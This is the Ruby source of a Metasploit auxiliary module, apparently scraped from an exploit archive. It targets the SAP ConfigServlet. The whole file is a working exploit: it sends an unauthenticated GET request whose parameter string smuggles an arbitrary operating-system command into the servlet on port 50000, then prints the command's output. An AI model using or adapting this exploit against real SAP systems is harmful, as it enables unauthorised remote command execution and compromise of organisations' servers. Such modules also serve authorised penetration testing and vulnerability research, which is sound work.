 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::Scanner
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;            => &#039;SAP ConfigServlet OS command execution&#039;,
            &#039;Description&#039;     => %q{
                    This module allows execution of operating system commands through
                the SAP ConfigServlet without any authentication.
            },
            &#039;Author&#039;          =>
                [
                    &#039;Andras Kabai&#039;, # Metasploit module
                ],
            &#039;License&#039;         => MSF_LICENSE,
            &#039;References&#039;      =>
                [
                    [ &#039;URL&#039;, &#039;http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf&#039;],
                ],
            ))
 
        register_options(
            [
                Opt::RPORT(50000),
                OptString.new(&#039;CMD&#039;, [ true, &#039;The command to execute&#039;, &#039;whoami&#039;]),
                OptString.new(&#039;PATH&#039;, [ true, &#039;Path to ConfigServlet &#039;, &#039;/ctc/servlet/ConfigServlet&#039;]),
                OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, false])
            ], self.class)
    end
 
    def run_host(ip)
        begin
            print_status("#{rhost}:#{rport} - Sending remote command: " + datastore[&#039;CMD&#039;])
            res = send_request_cgi(
                {
                    &#039;uri&#039;    => datastore[&#039;PATH&#039;] + &#039;?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=&#039; + Rex::Text.uri_encode(datastore[&#039;CMD&#039;]),
                    &#039;method&#039; => &#039;GET&#039;,
                })
            if !res or res.code != 200
                print_error("#{rhost}:#{rport} - Exploit failed.")
                return
            end
        rescue ::Rex::ConnectionError
            print_error("#{rhost}:#{rport} - Failed to connect to the server")
            return
        end
 
        if res.body.include?("Process created")
            print_good("#{rhost}:#{rport} - Exploited successfully\n")
            print_line("#{rhost}:#{rport} - Command: #{datastore[&#039;CMD&#039;]}\n")
            print_line("#{rhost}:#{rport} - Output: #{res.body}")
        else
            print_error("#{rhost}:#{rport} - Exploit failed.")
            vprint_error("#{rhost}:#{rport} - Output: #{res.body}")
        end
    end
end

